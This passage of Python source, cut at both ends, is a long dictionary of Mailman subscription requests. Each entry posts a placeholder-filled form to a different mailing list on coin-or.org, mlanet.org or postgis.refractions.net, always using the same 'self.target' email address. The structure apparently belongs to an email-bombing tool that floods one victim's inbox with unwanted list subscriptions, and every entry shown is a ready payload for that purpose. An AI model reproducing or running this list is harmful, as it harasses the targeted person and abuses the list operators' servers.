                'token_url': 'https://list.coin-or.org/mailman/listinfo/shot',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'LEHoE': {
                'url': 'https://list.coin-or.org/mailman/subscribe/shot-tickets',
                'token_url': 'https://list.coin-or.org/mailman/listinfo/shot-tickets',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'tFmii': {
                'url': 'https://list.coin-or.org/mailman/subscribe/smi',
                'token_url': 'https://list.coin-or.org/mailman/listinfo/smi',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'bIwfA': {
                'url': 'https://list.coin-or.org/mailman/subscribe/smi-tickets',
                'token_url': 'https://list.coin-or.org/mailman/listinfo/smi-tickets',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'HJudX': {
                'url': 'https://list.coin-or.org/mailman/subscribe/sonnet',
                'token_url': 'https://list.coin-or.org/mailman/listinfo/sonnet',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'wBPhO': {
                'url': 'https://list.coin-or.org/mailman/subscribe/sonnet-tickets',
                'token_url': 'https://list.coin-or.org/mailman/listinfo/sonnet-tickets',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ASDKA': {
                'url': 'https://list.coin-or.org/mailman/subscribe/svm-qp',
                'token_url': 'https://list.coin-or.org/mailman/listinfo/svm-qp',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'wLIXi': {
                'url': 'https://list.coin-or.org/mailman/subscribe/svm-qp-tickets',
                'token_url': 'https://list.coin-or.org/mailman/listinfo/svm-qp-tickets',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'kBUAn': {
                'url': 'https://list.coin-or.org/mailman/subscribe/symphony',
                'token_url': 'https://list.coin-or.org/mailman/listinfo/symphony',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'MBUpr': {
                'url': 'https://list.coin-or.org/mailman/subscribe/symphony-tickets',
                'token_url': 'https://list.coin-or.org/mailman/listinfo/symphony-tickets',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'nREuC': {
                'url': 'https://list.coin-or.org/mailman/subscribe/testtools',
                'token_url': 'https://list.coin-or.org/mailman/listinfo/testtools',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'SortT': {
                'url': 'https://list.coin-or.org/mailman/subscribe/testtools-tickets',
                'token_url': 'https://list.coin-or.org/mailman/listinfo/testtools-tickets',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'IwfGf': {
                'url': 'https://list.coin-or.org/mailman/subscribe/vol',
                'token_url': 'https://list.coin-or.org/mailman/listinfo/vol',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'oCTIe': {
                'url': 'https://list.coin-or.org/mailman/subscribe/vol-tickets',
                'token_url': 'https://list.coin-or.org/mailman/listinfo/vol-tickets',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'BJrbD': {
                'url': 'https://list.coin-or.org/mailman/subscribe/vrph',
                'token_url': 'https://list.coin-or.org/mailman/listinfo/vrph',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'wXGlG': {
                'url': 'https://list.coin-or.org/mailman/subscribe/vrph-tickets',
                'token_url': 'https://list.coin-or.org/mailman/listinfo/vrph-tickets',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'wWOLj': {
                'url': 'https://list.coin-or.org/mailman/subscribe/web-editors',
                'token_url': 'https://list.coin-or.org/mailman/listinfo/web-editors',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'rioNP': {
                'url': 'https://list.coin-or.org/mailman/subscribe/yaposib',
                'token_url': 'https://list.coin-or.org/mailman/listinfo/yaposib',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'qibbC': {
                'url': 'https://list.coin-or.org/mailman/subscribe/yaposib-tickets',
                'token_url': 'https://list.coin-or.org/mailman/listinfo/yaposib-tickets',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'CLWnG': {
                'url': 'https://pss.mlanet.org/mailman/subscribe/expertsearching_pss.mlanet.org',
                'token_url': 'https://pss.mlanet.org/mailman/listinfo/expertsearching_pss.mlanet.org',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'YSXlk': {
                'url': 'https://pss.mlanet.org/mailman/subscribe/pss_pss.mlanet.org',
                'token_url': 'https://pss.mlanet.org/mailman/listinfo/pss_pss.mlanet.org',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'tBjrd': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/africa',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/africa',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'VzObt': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/alberta',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/alberta',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'cpNzP': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/announce',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/announce',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'BTIHP': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/argentina',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/argentina',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'NEwQE': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/atlanticcanada',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/atlanticcanada',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'oIcyN': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/barcelona',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/barcelona',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'scLFV': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/belgium',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/belgium',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'BocQz': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/belgium-announce',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/belgium-announce',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'imJBy': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/benchmarking',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/benchmarking',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'sXsQn': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/board',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/board',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'FOqJi': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/board-ar',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/board-ar',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'QIQuq': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/board-es',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/board-es',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'oDkmK': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/board-fr',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/board-fr',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'lNTfq': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/bolivia',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/bolivia',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ffVKe': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/bootcamp08',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/bootcamp08',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ZXOVM': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/boston',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/boston',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'PsimX': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/brasil',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/brasil',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'sDleI': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/california',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/california',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'iXZAp': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/can_rnf',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/can_rnf',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'PzAxO': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/cantabria',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/cantabria',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'vvOOP': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/carto',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/carto',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'JUGAt': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/cat-interop',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/cat-interop',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'EJEwT': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/cbers-pds',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/cbers-pds',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'QpbWm': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/coc',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/coc',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'IIYHi': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/coc-discuss',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/coc-discuss',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'UEekb': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/cog',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/cog',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'PYxBu': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/conference-europe',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/conference-europe',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'zOSwQ': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/conference-workshops',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/conference-workshops',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'xQdnF': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/conference_dev',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/conference_dev',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'QWBSy': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/contractors',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/contractors',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'Asmaz': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/cordoba',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/cordoba',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'uTQwx': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/croatia',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/croatia',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'RdYnm': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/danmark',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/danmark',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'RaHFZ': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/discuss',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/discuss',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'fPAKU': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/distrs',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/distrs',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ZCDWX': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/dotnet',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/dotnet',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'FtcsW': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/drupal-geo',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/drupal-geo',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'IPlaF': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/dutch',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/dutch',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'rKUYl': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/edu_discuss',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/edu_discuss',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'pSNMc': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/educacao-pt',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/educacao-pt',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'XhOti': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/el',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/el',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'MWbSZ': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/es_norte',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/es_norte',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'KFndv': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/europe',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/europe',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'wehSb': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/euskadi',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/euskadi',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'RmVBJ': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/fdo-announce',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/fdo-announce',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'fntzk': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/fdo-commits',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/fdo-commits',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'KGHVm': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/fdo-internals',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/fdo-internals',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'IOYHV': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/fdo-trac',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/fdo-trac',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'SBiiL': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/fdo-users',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/fdo-users',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'nPiHY': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/featureserver',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/featureserver',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'tDcfe': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/finance',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/finance',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'QVRsI': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/finland',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/finland',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'IeCPy': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/forestrytools',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/forestrytools',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'RvMZJ': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/foss-gps',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/foss-gps',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'cseeF': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/foss4g-fr',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/foss4g-fr',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'lAWin': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/foss4g-oceania',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/foss4g-oceania',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'wjJSN': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/foss4g2008loc',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/foss4g2008loc',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'NjAbP': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/foss4g2009',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/foss4g2009',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'WDHMm': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/foss4g2009-announce',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/foss4g2009-announce',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'HKTNi': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/foss4g2010',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/foss4g2010',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'hbaox': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/foss4g2011',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/foss4g2011',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'MFutj': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/foss4g2013',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/foss4g2013',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'RhBun': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/foss4g2014',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/foss4g2014',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ogWAw': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/foss4g2015',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/foss4g2015',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'kqyWL': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/foss4g2016',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/foss4g2016',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'IntXj': {
                'url': 'http://postgis.refractions.net/mailman/subscribe/foss4g2017',
                'token_url': 'http://postgis.refractions.net/mailman/listinfo/foss4g2017',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
